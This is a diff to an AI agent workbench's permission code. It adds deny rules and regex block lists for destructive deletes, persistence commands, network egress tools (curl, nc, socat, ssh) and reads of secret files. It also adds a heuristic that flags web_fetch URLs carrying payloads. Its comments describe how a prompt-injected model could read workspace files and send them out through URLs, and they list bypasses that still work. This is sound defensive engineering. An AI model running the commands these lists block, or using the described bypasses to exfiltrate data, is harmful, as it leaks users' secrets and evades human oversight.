@@ -12960,7 +13234,12 @@ async function guardFileToolPath(rawPath, ctx, opts) {
     const normReal = normalizeAutoexecPath(real);
     if (AUTOEXEC_DENYLIST.some(re => re.test(normAbs) || re.test(normReal)) || isAutoLoadedLaunchConfigPath(abs) || isAutoLoadedLaunchConfigPath(real)) {
       logEvent({ kind: 'workspace_boundary', tool, op: 'write', decision: 'deny-autoexec', pathLen: abs.length });
-      return { ok: false, code: 'autoexec-denied', error: '该路径属于自动执行文件(如 git hooks/CI 配置/agent CLI 与 MCP 启动配置),已禁止通过文件工具写入;如确需编辑,请直接在终端操作' };
+      return { ok: false, code: 'autoexec-denied', error: '该路径属于自动执行文件(如 git hooks/CI 配置/agent CLI 与 MCP 启动配置/启动文件夹/PowerShell profile/.ssh 配置),已禁止通过文件工具写入;如确需编辑,请直接在终端操作' };
+    }
+    // 安全走查 S4(续):挂在用户真实家目录下的 shell rc / .gitconfig / ~/.claude/CLAUDE.md / ~/.codex / ~/.kimi 等(见 userHomePersistenceHit)。
+    if (userHomePersistenceHit(abs) || userHomePersistenceHit(real)) {
+      logEvent({ kind: 'workspace_boundary', tool, op: 'write', decision: 'deny-user-persistence', pathLen: abs.length });
+      return { ok: false, code: 'autoexec-denied', error: '该路径是用户级登录 / 全局配置(shell 启动脚本、.gitconfig、Claude / Codex / Kimi 的全局指令与配置等),改动会在之后每次开终端或开 agent CLI 时生效,已禁止通过文件工具写入;如确需编辑,请直接在终端操作' };
     }
     // v2.7.1 (opt#1): OS 关键目录硬地板 -- bypass/auto 宽写下也始终拒写(系统级安全保护第三层)。abs 与 real 双查。
     if (isOsCriticalPath(abs) || isOsCriticalPath(real)) {
@@ -20836,7 +21115,8 @@ const AGENT_CLI_ADAPTERS = Object.freeze({
       // --dangerously-skip-permissions shortcut. They are functionally equivalent per Anthropic docs, but
       // --permission-mode is the forward-compatible, officially documented way to set the session mode.
       // The syncClaudeCliSettings() call (on config save) also writes permissions.defaultMode to
-      // ~/.claude/settings.json so the mode persists even if a CLI version ignores the flag.
+      // ~/.claude/settings.json so the mode persists even if a CLI version ignores the flag —— 安全走查 S9:bypass 档除外,
+      // 它【不】写 bypassPermissions 进用户全局(会波及脱离如意的独立 claude 会话),只靠这里每回合的命令行参数。
       // v1.4.3: use the unified CLAUDE_PERMISSION_MODE_MAP for all modes
       const cliPermMode = CLAUDE_PERMISSION_MODE_MAP[config.permissionMode] || config.permissionMode;
       if (cliPermMode) args.push('--permission-mode', cliPermMode);
@@ -30632,6 +30912,18 @@ const STEWARD_EXEMPT_CONTENT_GROUPS = Object.freeze([
   Object.freeze({ category: 'delete_data', floor: false, patterns: Object.freeze([
     /\brm\s+-[a-z]*r/i, /\brmdir\b/i, /\bdel\s+\/[sq]/i,
     /\bremove-item\b[^\n]{0,200}?-(recurse|force)/i,
+    // 安全走查 S2:递归删除的缩写与 API 形式(下面全是【只加不改】,上面四条逐字未动)。
+    //   · PowerShell 的参数前缀缩写与别名:Remove-Item … -r / -rec(-Recurse 的任意前缀)、-fo(-Force 的无歧义缩写;-f 与 -Filter 歧义,不是合法写法);
+    //     别名 ri / del / erase / rd / rm 同样吃这些开关;
+    //   · GNU rm 把开关放在操作数后面(`rm dir -rf`,上面那条只认紧跟 rm 的开关)、argv 数组形态(['rm','-rf',…]);
+    //   · cmd 的 rd /s、erase /s;find … -delete;
+    //   · 脚本语言的 API:python shutil.rmtree、node 的 .rm / .rmSync / .rmdir(带 recursive;require 链式调用的 rmSync 前面没有 fs. 前缀,所以不锚 fs)、rimraf、.NET [IO.Directory]::Delete。
+    /\b(?:remove-item|ri|del|erase|rd|rmdir|rm)\b[^\n]{0,200}?\s-(?:r|re|rec|recu|recur|recurs|recurse)(?=[\s:]|$)/i,
+    /\b(?:remove-item|ri|del|erase|rd)\b[^\n]{0,200}?\s-fo(?:r|rc|rce)?(?=[\s:]|$)/i,
+    /\brm\b[^\n]{0,200}?\s-[a-z]*r[a-z]*(?=\s|$)/i, /\brm['"]?\s*,\s*['"]-[a-z]*r/i,
+    /\b(?:rd|erase)\s+\/[sq]\b/i, /\bfind\b[^\n]{0,200}?\s-delete\b/i,
+    /\bshutil\.rmtree\b/i, /\brimraf\b/i, /\.(?:rm|rmSync|rmdir|rmdirSync)\s*\([^\n]{0,300}?recursive/i,
+    /\[\s*(?:system\.)?io\.directory\s*\]\s*::\s*delete\b/i,
   ]) }),
   Object.freeze({ category: 'delete_data', floor: true, patterns: Object.freeze([
     /\bformat\s+[a-z]:/i, /\bdiskpart\b/i, /\bmkfs\b/i,
@@ -30642,6 +30934,15 @@ const STEWARD_EXEMPT_CONTENT_GROUPS = Object.freeze([
     /\b(set|new|remove)-itemproperty\b[^\n]{0,200}?hk(lm|cu)/i,
     /\bnetsh\b/i, /\bshutdown\b/i, /\bbcdedit\b/i,
     /\b(restart|stop)-computer\b/i,
+    // 安全走查 S2:持久化 / 提权 / 改系统服务与执行策略(都是「装了就一直在」的系统级改动,与注册表同属底线,只能用户亲自按):
+    //   schtasks /create|/change|/run、Register-ScheduledTask / Set-ScheduledTask / Register-ScheduledJob、Set-ExecutionPolicy、
+    //   sc create|config|delete|failure(服务)、New-Service / Set-Service、Defender 排除项 Add/Set-MpPreference、
+    //   reg.exe 的 add/delete(上面的 reg add 认不出 reg.exe)与 import/copy/load/unload/restore/save。
+    /\bschtasks(?:\.exe)?\b[^\n]{0,200}?\/(?:create|change|run)\b/i,
+    /\b(?:register|set)-scheduled(?:task|job)\b/i, /\bset-executionpolicy\b/i,
+    /\bsc(?:\.exe)?\s+(?:\\\\\S+\s+)?(?:create|config|delete|failure)\b/i,
+    /\b(?:new|set)-service\b/i, /\b(?:add|set)-mppreference\b/i,
+    /\breg(?:\.exe)?\s+(?:add|delete|import|copy|load|unload|restore|save)\b/i,
   ]) }),
   // ③ 安装卸载软件
   Object.freeze({ category: 'install', floor: false, patterns: Object.freeze([
@@ -30658,11 +30959,17 @@ const STEWARD_EXEMPT_CONTENT_GROUPS = Object.freeze([
     /\binvoke-(webrequest|restmethod)\b[^\n]{0,300}?(-method\s*(post|put|patch|delete)\b|-body\b)/i,
   ]) }),
   Object.freeze({ category: 'outbound_send', floor: true, patterns: Object.freeze([
-    /\b(sendmail|mailx)\b/i, /\bmail\s+-s\b/i,
+    /\b(sendmail|mailx)\b/i, /\bmail\s+-s\b/i, /\bsend-mailmessage\b/i,
   ]) }),
   // ⑤ 把改动推出去(git push 不可撤销地外溢到远端)
   Object.freeze({ category: 'push_remote', floor: false, patterns: Object.freeze([
     /\bgit\s+push\b/i,
+    // 安全走查 S2:`git.exe push`、`git -c k=v push`、`git -C dir push`、`git --no-pager push`(开关夹在 git 与 push 之间,上面的 `git\s+push` 认不出),
+    // argv 数组形态(['git','push']);包管理器 / 镜像仓库的发布同属「把东西推出去」:npm|pnpm|yarn publish、twine upload、cargo publish、docker push、nuget push、gem push、vsce publish。
+    /\bgit(?:\.exe)?["']?(?:\s+(?:-[cC]\s+(?:[^\s"']|"[^"\n]*"|'[^'\n]*')+|--[\w-]+(?:=(?:[^\s"']|"[^"\n]*"|'[^'\n]*')+)?|-[a-zA-Z]\b))*\s+push\b/i,
+    /\bgit['"]?\s*,\s*['"]push\b/i,
+    /\b(?:npm|pnpm|yarn)(?:\.cmd)?\s+(?:[\w:@./-]+\s+)*?publish\b/i,
+    /\b(?:twine\s+upload|cargo\s+publish|docker\s+push|(?:dotnet\s+)?nuget\s+push|gem\s+push|vsce\s+publish)\b/i,
   ]) }),
 ]);
 // 127 波 2-quater B1 ②:灾难性删除目标(主会话在拍板 1 之外另加的底线项)。`rm -rf ./build` 与 `rm -rf /`
@@ -30741,6 +31048,62 @@ function stewardAutoAskIndirect(input) {
   if (input == null) return false;
   const composed = stewardExemptInputText(input).slice(0, STEWARD_EXEMPT_INPUT_CHARS);
   return !!composed && STEWARD_AUTO_ASK_INDIRECT_PATTERNS.some(pattern => pattern.test(composed));
+}
+// 安全走查 S2(「智能自动」档对 exec 工具是正则黑名单,实测一串写法直接绕过):不改成白名单(那是产品形态变更),而是把报告里实测绕过的那些写法补进判据。
+// 分两处,口径刻意分开:
+//   · 递归删除的缩写与 API 形式、git 的 -c/-C/.exe push、npm|pnpm|yarn publish 等发布、schtasks /create、Register-ScheduledTask、Set-ExecutionPolicy、
+//     sc create、reg.exe add:补进上面 STEWARD_EXEMPT_CONTENT_GROUPS 的【原有类别】(删数据 / 推送远端 / 改系统),只加不改 —— 管家代批的八道闸、类别标签、
+//     底线标记原样适用;
+//   · 网络外发(下面 EGRESS)与读数据根里的密钥文件(下面 DATAROOT):【不进】上面的豁免组 —— 豁免组的语义是「这条命令属于那五类不可撤销的动作」,
+//     而 unit/steward-exempt.test.js 钉着「纯 GET 读取(curl -s https://… / Invoke-WebRequest … -OutFile)不属于对外发送」;GET 照样能把数据放进网址外传
+//     (实测 python urllib POST、node fetch、curl.exe GET、Invoke-WebRequest 全部无提示放行),所以另立两张【只管智能自动停问】的表,
+//     与 STEWARD_AUTO_ASK_INDIRECT_PATTERNS 同一个用法:nativeToolGate 命中 → 停下来问;管家(13l)对这一类不代批,只能用户亲自按。
+// 误伤纪律:`git status/diff/log`、`npm test`、`node script.js`、读本地文件这些日常开发动作一条都不命中(unit/auto-exec-egress-gate.test.js 钉着样本)。
+// 已知没覆盖(诚实):把命令拆成变量再拼(`$c='cu'+'rl'; & $c …`,强信号部分由 INDIRECT 表管)、先写脚本文件再运行、DNS 外传(ping <数据>.evil.com)、
+// git clone / pull / ls-remote 把数据放进远端网址 —— 要治得做白名单或执行沙箱;由执行闸、审计与线程档位兜底。
+const STEWARD_AUTO_ASK_EGRESS_PATTERNS = Object.freeze([
+  // PowerShell / Windows 自带的下载上传:Invoke-WebRequest 及别名 iwr、Invoke-RestMethod 及别名 irm、BITS、.NET 的 WebClient / HttpClient / WebRequest / TcpClient
+  /\b(?:invoke-webrequest|invoke-restmethod|iwr|irm)\b/i,
+  /\bstart-bitstransfer\b/i, /\bbitsadmin(?:\.exe)?\b[^\n]{0,80}?\/transfer/i, /\bcertutil(?:\.exe)?\b[^\n]{0,120}?-urlcache/i,
+  /\bnet\.webclient\b/i, /\bnet\.webrequest\b/i, /\bnet\.http\.httpclient\b/i, /\bnet\.sockets\.tcpclient\b/i,
+  // curl / wget(含 .exe;GET 同样能带数据出去,所以不论方法)
+  /\bcurl(?:\.exe)?\b/i, /\bwget(?:\.exe)?\b/i,
+  // python:urllib.request / urllib2 / urlopen、requests、http.client / httplib、httpx、aiohttp、裸 socket、ftplib / smtplib / paramiko
+  /\burllib\.request\b/i, /\burllib2\b/i, /\burlopen\s*\(/i, /\bfrom\s+urllib\s+import\s+[^\n]*\brequest\b/i,
+  /\b(?:import|from)\s+requests\b/i, /\brequests\.(?:get|post|put|patch|delete|head|request|session)\b/i,
+  /\bhttp\.client\b/i, /\bhttplib\b/i, /\bhttpx\b/i, /\baiohttp\b/i, /\bsocket\.(?:socket|create_connection)\b/i,
+  /\bftplib\b/i, /\bsmtplib\b/i, /\bparamiko\b/i,
+  // node:fetch(、http(s).request / .get(、require/import 'http' 'https' 'net' 'tls' 'dgram' 'http2'、axios、node-fetch、XMLHttpRequest、net.connect
+  /\bfetch\s*\(/i, /\bhttps?\.(?:request|get)\s*\(/i,
+  /\brequire\s*\(\s*['"](?:node:)?(?:https?|net|tls|dgram|http2)['"]\s*\)/i,
+  /\bimport\b[^\n]{0,80}?\bfrom\s+['"](?:node:)?(?:https?|net|tls|dgram|http2)['"]/i,
+  /\baxios\b/i, /\bnode-fetch\b/i, /\bXMLHttpRequest\b/i, /\bnet\.(?:connect|createConnection)\s*\(/i,
+  // 命令行外联:nc / ncat / netcat / socat、scp / sftp / ftp / tftp、ssh <主机>(管道外传 `cat f | ssh host 'cat > x'`)、rsync 到远端、nslookup / Resolve-DnsName(DNS 外传)
+  /\b(?:nc|ncat|netcat|socat)(?:\.exe)?\b/i, /\b(?:scp|sftp|ftp|tftp)(?:\.exe)?\b/i, /\bssh(?:\.exe)?\s+\S/i,
+  /\brsync\b[^\n]{0,200}?(?:\s[\w.@-]+@[\w.-]+:|rsync:\/\/)/i, /\b(?:nslookup|resolve-dnsname)\b/i,
+]);
+// 读如意数据根里的密钥 / 状态文件:runtime.json(WCW token)、<数据根>\config.json(明文 provider 密钥)及其备份族、会话 / 记忆 / 计费 / 审计 / 管家 / 事项 / 调度。
+// 文件工具层早已把这些封死(03 isSensitiveDataPath),但 exec 工具(script_run / powershell_run)直接读盘,实测把 token 读出来 POST 到外部端口全程零弹窗。
+// 单独的 `config.json` 在普通工程里太常见,所以只认「数据根目录名后面跟着这些名字」「runtime.json」「config.json 备份族」与数据根 / token 的环境变量名。
+const STEWARD_AUTO_ASK_DATAROOT_PATTERNS = Object.freeze([
+  /\bruntime\.json\b/i,
+  /(?:\.ruyi-workbench|\.win-claude-workbench)[^\n]{0,160}?(?:\b(?:config|runtime)\.json\b|[\\/'"\s,](?:sessions|memory|usage|logs|steward|missions|scheduler|engine-transcripts|claude-settings-sync)\b)/i,
+  /\bconfig\.json\.(?:prev|bak)/i,
+  /\b(?:RUYI_HOME|WIN_CLAUDE_WORKBENCH_HOME|WCW_TOKEN)\b/,
+]);
+// 这两张表只扫【命令类】工具的入参。编排类工具(orchestrate_agents / spawn_agent)的入参是给子代理的任务描述文字 —— 「重构一下 fetch( ) 封装」「用 curl 测接口」
+// 在那里是散文,不是命令;子代理自己的每一步工具调用在它自己的回合里照样过闸。
+const STEWARD_AUTO_ASK_PROSE_TOOLS = Object.freeze(['orchestrate_agents', 'spawn_agent']);
+// 返回 '' / 'egress' / 'dataroot'(同时命中报 dataroot —— 读密钥更要紧)。toolName 可缺省(= 扫)。
+function stewardAutoAskSensitiveKind(toolName, input) {
+  if (input == null) return '';
+  const bare = String(toolName == null ? '' : toolName).replace(/^.*__/, '');
+  if (STEWARD_AUTO_ASK_PROSE_TOOLS.includes(bare)) return '';
+  const composed = stewardExemptInputText(input).slice(0, STEWARD_EXEMPT_INPUT_CHARS);
+  if (!composed) return '';
+  if (STEWARD_AUTO_ASK_DATAROOT_PATTERNS.some(pattern => pattern.test(composed))) return 'dataroot';
+  if (STEWARD_AUTO_ASK_EGRESS_PATTERNS.some(pattern => pattern.test(composed))) return 'egress';
+  return '';
 }
 // 107-S1 ③(46 号文 §5 ⑦b H2 实验 E1):**删数据类只在目标是相对路径时才可代批**。
 // 实测 `Remove-Item C:\Users -Recurse -Force`、`rm -rf /home/me/notes`、
@@ -38026,9 +38389,89 @@ function estimateToolSchemaTokens(tools) {
 // 清单的纪律是「宁可误判成要人按,不可漏判成自动执行」,两个判据各写一份必然漂移。
 // toolName 缺省(调用方没传)一律回落 'ask':保守优先,新调用面忘了传参不会静默放权。
 // 模块方向:07 调 06i 是后向边(06i 在 manifest 里排 18,07 排 23),合法。
+// 安全走查 S1(读档联网是无提示外传通道):web_fetch / web_search 在 NATIVE_TOOL_TIER 里是 read 档,nativeToolGate 对 read 在所有档位都放行 ——
+// 被提示注入的模型可以 file_read 工作区里任何文件,再 web_fetch("https://攻击者/?d=<内容>") 无提示外传(SSRF 闸只挡内网,不挡公网目的地)。
+// 联网搜索 / 抓取本身仍是 read 档(不整体变成要确认:日常研究要能无打扰地跑),但【看起来带了载荷】的请求在除 bypass 以外的所有档位先停下来问:
+//   · 网址的查询串 + fragment 总长 > 256;
+//   · 任一查询参数的值(解码后)> 128;
+//   · 路径 / 参数 / fragment 里有 ≥ 64 字符的 hex 连续串,或「像 base64」的连续串(见 webLooksEncoded);
+//   · 主机名里有 ≥ 48 字符的单个标签(DNS 外传:<编码数据>.攻击者.com;DNS 标签上限 63);
+//   · web_search 的查询 > 300 字,或查询里有 ≥ 64 字符的编码串。
+// 阈值依据:正常抓取 / 搜索的网址查询串几乎都在 100 字以内(搜索引擎结果页 ?q=…&hl=…、分页、utm 追踪参数一般 < 150),单个参数值很少过 100;
+// 常见的长 ID 都 < 64:git 提交 SHA-1 40 位、Notion / Google Docs 文档 ID 32~44 位、UUID 36 位;256 / 128 / 64 都留了余量,又足以把「整份文件内容塞进网址」拦下。
+// 没覆盖的(诚实):低于阈值的小额外传(一个 API key 约 50 字符、一个 32 位 token 能从阈值下面过去)—— 这条挡的是批量载荷,不是逐字符审计;
+// 要杜绝得对「本回合读过本地文件之后的新域名」做确认(产品形态变更,未做)。
+// 同一判据覆盖 http_request / http_download 的网址(读档以上的同类外联口:GET 带长查询串同样能外传),以及 CLI 引擎的 WebFetch / WebSearch。
+const WEB_PAYLOAD_LIMITS = Object.freeze({ queryFragmentChars: 256, paramValueChars: 128, encodedRunChars: 64, hostLabelChars: 48, searchQueryChars: 300 });
+const WEB_PAYLOAD_URL_TOOLS = Object.freeze(['web_fetch', 'WebFetch', 'http_request', 'http_download']);
+const WEB_PAYLOAD_QUERY_TOOLS = Object.freeze(['web_search', 'WebSearch']);
+// 「像编码出来的」:≥ encodedRunChars 的 hex 连续串;或 [A-Za-z0-9+/_=-] 连续串(base64 / base64url),且同时有字母和数字、连字符 / 下划线占比 ≤ 1/8
+// (长文章 slug 如 how-to-install-…-2026 连字符多、词与词之间有分隔,不算;真 base64url 里 - _ 的期望占比约 3%)。
+function webLooksEncoded(text) {
+  const t = String(text == null ? '' : text);
+  const n = WEB_PAYLOAD_LIMITS.encodedRunChars;
+  if (t.length < n) return false;
+  if (new RegExp('[0-9a-fA-F]{' + n + ',}').test(t)) return true;
+  const runs = t.match(new RegExp('[A-Za-z0-9+/_=-]{' + n + ',}', 'g')) || [];
+  for (const run of runs) {
+    if (!/[0-9]/.test(run) || !/[A-Za-z]/.test(run)) continue;
+    const seps = (run.match(/[-_]/g) || []).length;
+    if (seps * 8 > run.length) continue;
+    return true;
+  }
+  return false;
+}
+// 只做百分号解码,【不】把 + 当空格:标准 base64 里的 + 若按表单语义变成空格,连续串就被切断,载荷反而躲过了编码串判据(长度判据不受影响)。
+function webSafeDecode(s) {
+  const raw = String(s == null ? '' : s);
+  try { return decodeURIComponent(raw); } catch { return raw; }
+}
+// 返回 '' = 不像载荷;否则是命中的判据名(进日志 / 子代理拒绝文案)。纯函数,不碰网络、不做 DNS。
+function webUrlPayloadReason(url) {
+  const s = String(url == null ? '' : url).trim();
+  if (!s) return '';
+  const hashAt = s.indexOf('#');
+  const frag = hashAt >= 0 ? s.slice(hashAt + 1) : '';
+  const noHash = hashAt >= 0 ? s.slice(0, hashAt) : s;
+  const qAt = noHash.indexOf('?');
+  const query = qAt >= 0 ? noHash.slice(qAt + 1) : '';
+  const head = qAt >= 0 ? noHash.slice(0, qAt) : noHash;
+  if (query.length + frag.length > WEB_PAYLOAD_LIMITS.queryFragmentChars) return 'query_fragment_long';
+  const afterScheme = head.replace(/^[a-z][a-z0-9+.-]*:\/\//i, '');
+  const slashAt = afterScheme.indexOf('/');
+  const hostPort = slashAt >= 0 ? afterScheme.slice(0, slashAt) : afterScheme;
+  const pathPart = slashAt >= 0 ? afterScheme.slice(slashAt) : '';
+  const host = hostPort.replace(/^[^@]*@/, '').replace(/:\d*$/, '');
+  if (host.split('.').some(label => label.length >= WEB_PAYLOAD_LIMITS.hostLabelChars)) return 'host_label_long';
+  const values = [];
+  for (const pair of query.split('&')) {
+    if (!pair) continue;
+    const eq = pair.indexOf('=');
+    values.push(webSafeDecode(eq >= 0 ? pair.slice(eq + 1) : pair));
+  }
+  if (values.some(v => v.length > WEB_PAYLOAD_LIMITS.paramValueChars)) return 'param_long';
+  const pieces = [...pathPart.split('/').map(webSafeDecode), ...values, webSafeDecode(frag)];
+  if (pieces.some(webLooksEncoded)) return 'encoded_run';
+  return '';
+}
+// 工具名容忍 serverId__ / mcp__server__ 前缀(Claude 引擎经 MCP 叫的是 mcp__ruyi__web_fetch)。
+function webPayloadReason(toolName, input) {
+  const bare = String(toolName == null ? '' : toolName).replace(/^.*__/, '');
+  if (!input || typeof input !== 'object' || Array.isArray(input)) return '';
+  if (WEB_PAYLOAD_QUERY_TOOLS.includes(bare)) {
+    const q = String(input.query == null ? '' : input.query);
+    if (q.length > WEB_PAYLOAD_LIMITS.searchQueryChars) return 'search_query_long';
+    if (q.split(/\s+/).some(webLooksEncoded)) return 'search_encoded_run';
+    return '';
+  }
+  if (WEB_PAYLOAD_URL_TOOLS.includes(bare)) return webUrlPayloadReason(input.url);
+  return '';
+}
 function nativeToolGate(mode, tier, toolName, input) {
   // v1.4.3: accept both 'bypass' (internal) and 'bypassPermissions' (CLI-native) as full-bypass
   if (mode === 'bypass' || mode === 'bypassPermissions') return 'allow';
+  // 安全走查 S1:联网请求看起来带了载荷 → 除 bypass 以外所有档位(含 plan、read 档)先确认;走既有的权限请求,不另造一套。
+  if (toolName && webPayloadReason(toolName, input)) return 'ask';
   if (tier === 'read') return 'allow';
   if (mode === 'plan' || mode === 'dontAsk') return 'block';
   // v1.4.3: 'auto' mode — AI risk-classifier decides. In the native engine we approximate:
@@ -38039,7 +38482,8 @@ function nativeToolGate(mode, tier, toolName, input) {
     if (!toolName) return 'ask';                                    // 调用方没给名字 = 保守问
     // 2026-10:命令是拼出来 / 编码出来 / 求值出来的(强信号,06i stewardAutoAskIndirect)也停下来问 ——
     // 字面量判据看不穿它真正要跑什么。管家对这一类不代批(13l),只能用户亲自按。
-    return (stewardToolPermanentlyExempt(toolName, input) || stewardAutoAskIndirect(input)) ? 'ask' : 'allow';
+    // 安全走查 S2:网络外发与读数据根密钥文件(06i stewardAutoAskSensitiveKind)同样停下来问;命令类工具才扫,编排类的任务描述文字不扫。
+    return (stewardToolPermanentlyExempt(toolName, input) || stewardAutoAskIndirect(input) || stewardAutoAskSensitiveKind(toolName, input) !== '') ? 'ask' : 'allow';
   }
   return 'ask';
 }
@@ -38680,7 +39124,10 @@ async function readClaudeProjectAgentRoles(cwd) {
   }
   return out;
 }
-async function getAgentRoleLibrary(cwd, config) {
+// 安全走查 S3:opts.parentMode = 调用方认的父回合档位(缺省取 config.permissionMode —— 回合内的 config 已解析成这条线程的档)。
+// 项目来源的角色(.ruyi/agents.json / .claude/agents)在返回时带上【有效档位】标注(effectivePermissionMode / effectiveToolTier / roleClamped),
+// 角色自己声明的 permissionMode / toolTier 原样保留(设置页编辑器原样存回);真正的夹紧在子代理起跑处(08 / 07)按那一刻的父档再算一次。
+async function getAgentRoleLibrary(cwd, config, opts) {
   const merged = new Map();
   for (const raw of BUILTIN_AGENT_ROLES) { const role = normalizeAgentRole(raw, { source: 'builtin', builtin: true }); merged.set(role.id, role); }
   for (const role of (Array.isArray(config.agentRoleOverrides) ? config.agentRoleOverrides : [])) {
@@ -38691,7 +39138,8 @@ async function getAgentRoleLibrary(cwd, config) {
   }
   const claudeNative = await readClaudeProjectAgentRoles(cwd);
   for (const role of claudeNative) if (!merged.has(role.id)) merged.set(role.id, role);
-  return [...merged.values()].filter(Boolean);
+  const parentMode = (opts && opts.parentMode) || (config && config.permissionMode) || 'default';
+  return [...merged.values()].filter(Boolean).map(role => annotateAgentRoleEffective(role, parentMode));
 }
 // 项目级写入(.ruyi/agents.json、.ruyi/workflows.json)的 cwd 来自请求体:目录不存在或是个文件时,下面的 mkdir 会抛
 // ENOTDIR / EEXIST,路由兜底成 500,还把带宿主路径的 errno 原文回给前端。写前先 stat 一下:不是目录就回 400 人话
@@ -38719,7 +39167,8 @@ async function buildClaudeAgentDefinitions(cwd, config, jsonBudget = 6000) {
     const d = { description: role.description || role.label, prompt: role.prompt || role.description || role.label };
     if (role.claudeTools && role.claudeTools.length) d.tools = role.claudeTools;
     if (role.models && role.models.claude && role.models.claude !== 'inherit') d.model = role.models.claude;
-    const pm = claudePermissionMode(role.permissionMode); if (pm) d.permissionMode = pm;
+    // 安全走查 S3:项目来源的角色把权限档夹到不高于这一回合的线程档位再交给 CLI(CLI 的 --agents 子代理按这个档起跑,不夹就能靠项目角色放宽)。
+    const pm = claudePermissionMode(clampAgentRoleToParent(role, role.toolTier, config && config.permissionMode).permissionMode || role.permissionMode); if (pm) d.permissionMode = pm;
     if (role.mcpServers && role.mcpServers.length) d.mcpServers = role.mcpServers;
     if (role.budgets && role.budgets.claude) d.maxTurns = role.budgets.claude;
     if (role.isolation === 'worktree') d.isolation = 'worktree';
@@ -38851,10 +39300,14 @@ async function runClaudeSubAgentOnce({ config, parentSession, task, displayTask,
       iters: 0, toolCalls: 0 };
   }
   const role = roleDefinition || null;
-  const tier = (toolTier === 'edit' || toolTier === 'exec') ? toolTier : 'read';
+  const tier0 = (toolTier === 'edit' || toolTier === 'exec') ? toolTier : 'read';
   const subModel = String(model || (role && role.models && role.models.claude !== 'inherit' && role.models.claude) || '').trim();
 
-  const roleMode = role && role.permissionMode && role.permissionMode !== 'inherit' ? role.permissionMode : '';
+  // 安全走查 S3:项目来源的角色(.ruyi/agents.json 等)把有效权限档 / 工具级夹到不高于父回合档位;builtin / global 来源逐字不变。
+  const roleGuard = clampAgentRoleToParent(role, tier0, permModeOverride === 'plan' ? 'plan' : (permModeOverride || config.permissionMode || 'default'));
+  const tier = roleGuard.toolTier;
+  if (roleGuard.clamped) { try { logEvent({ kind: 'agent_role_clamped', engine: 'claude', roleId: role && role.id || '', source: role && role.source || '', clamped: roleGuard.clamped }); } catch { /* 遥测不阻断 */ } }
+  const roleMode = roleGuard.permissionMode;
   // 线程 / 工作流下发的只做计划档压过角色自带的档(与 OpenAI 路径 08 runSubAgentCoreBody 同一条优先级)。
   const requestedMode = permModeOverride === 'plan' ? 'plan' : (roleMode || permModeOverride || config.permissionMode || 'default');
   const grant = claudeSubagentPermission(requestedMode, tier, role && role.claudeTools);
@@ -38919,7 +39372,7 @@ async function runClaudeSubAgentOnce({ config, parentSession, task, displayTask,
   const env = effectiveAnthropicEnv(config);
   if (fakeClaude) env.WCW_FAKE_INTERACTIVE = '1';
 
-  onEvent({ type: 'subagent', id: subagentId, state: 'start', task: String(displayTask != null ? displayTask : task || ''), toolTier: tier, agentKey, dependsOn: dependsOn || [], roleId: role && role.id || '', roleLabel: role && role.label || '', model: subModel || 'inherit', permissionMode: role && role.permissionMode || 'inherit', mcpServers: roleMcpServers, engine: 'claude' });
+  onEvent({ type: 'subagent', id: subagentId, state: 'start', task: String(displayTask != null ? displayTask : task || ''), toolTier: tier, agentKey, dependsOn: dependsOn || [], roleId: role && role.id || '', roleLabel: role && role.label || '', model: subModel || 'inherit', permissionMode: roleGuard.permissionMode || 'inherit', ...(roleGuard.clamped ? { roleClamped: roleGuard.clamped } : {}), mcpServers: roleMcpServers, engine: 'claude' });
 
   const workingDir = cwd || process.cwd();
   await fsp.mkdir(workingDir, { recursive: true }).catch(() => {});
@@ -39741,7 +40194,12 @@ async function runSubAgentCoreBody({ parentSession, provider, config, task, disp
     stopInitBeat(); return { ok: false, error: '子代理无法启动:provider 端点或模型未配置', iters: 0, toolCalls: 0 };   // 修前心跳不停:每秒一次、一直重写 run 快照
   }
   const requestedTier = toolTier || (role && role.toolTier);
-  const tier = (requestedTier === 'edit' || requestedTier === 'exec') ? requestedTier : 'read';
+  const tier0 = (requestedTier === 'edit' || requestedTier === 'exec') ? requestedTier : 'read';
+  // 安全走查 S3:项目来源的角色(.ruyi/agents.json 等)把有效权限档 / 工具级夹到不高于父回合档位(只能收紧);builtin / global 来源逐字不变。
+  // 这里按「起跑那一刻」的父档夹工具级(决定 offer 哪些工具);逐次工具调用的权限判定下面按【此刻】的父档再夹一次(父线程中途改档要生效)。
+  const roleGuard = clampAgentRoleToParent(role, tier0, permModeOverride === 'plan' ? 'plan' : (permModeOverride || config.permissionMode || 'default'));
+  const tier = roleGuard.toolTier;
+  if (roleGuard.clamped) { try { logEvent({ kind: 'agent_role_clamped', engine: 'openai', roleId: role && role.id || '', source: role && role.source || '', clamped: roleGuard.clamped }); } catch { /* 遥测不阻断 */ } }
   // 117m-A1(同 09 的 gateWithLiveMode,判据一字不差):子回合跑在父会话的档下,父线程中途改档要对
   // 【这个】子回合生效。只有在本子回合期间【被改过】才接管;没改过返回 '' → 下面的 effMode 逐字节
   // 走原来的优先级。角色自带的档(roleMode)与工作流下发的 permModeOverride 都排在它前面 —— 那两个
@@ -39851,7 +40309,7 @@ async function runSubAgentCoreBody({ parentSession, provider, config, task, disp
     return b;
   };
 
-  onEvent({ type: 'subagent', id: subagentId, state: 'start', task: String(displayTask != null ? displayTask : task || ''), toolTier: tier, agentKey, dependsOn: dependsOn || [], roleId: role && role.id || '', roleLabel: role && role.label || '', model: subModel, permissionMode: role && role.permissionMode || 'inherit', mcpServers: role && role.mcpServers || [], engine: 'openai' });
+  onEvent({ type: 'subagent', id: subagentId, state: 'start', task: String(displayTask != null ? displayTask : task || ''), toolTier: tier, agentKey, dependsOn: dependsOn || [], roleId: role && role.id || '', roleLabel: role && role.label || '', model: subModel, permissionMode: roleGuard.permissionMode || 'inherit', ...(roleGuard.clamped ? { roleClamped: roleGuard.clamped } : {}), mcpServers: role && role.mcpServers || [], engine: 'openai' });
   // The sub-loop shares the parent's AbortController (ctrl) so a Stop on the parent turn also arrests the
   // sub-turn. rawSeq is local (its raw_line frames carry subagentId so the debug pane can attribute them).
   const rawSeqRef = { n: 0 };
@@ -40205,8 +40663,10 @@ async function runSubAgentCoreBody({ parentSession, provider, config, task, disp
             // resolves to a refusal result so the sub-turn keeps moving rather than hanging.
             // v0.9 F4: gate on the effective per-turn mode (permModeOverride) — the parent passes 'default'
             // ONLY when the plan was approved this turn, else the parent's own config.permissionMode.
-            const roleMode = role && role.permissionMode && role.permissionMode !== 'inherit' ? role.permissionMode : '';
-            const effMode = permModeOverride === 'plan' ? 'plan' : (roleMode || permModeOverride || liveParentPermissionMode() || config.permissionMode);
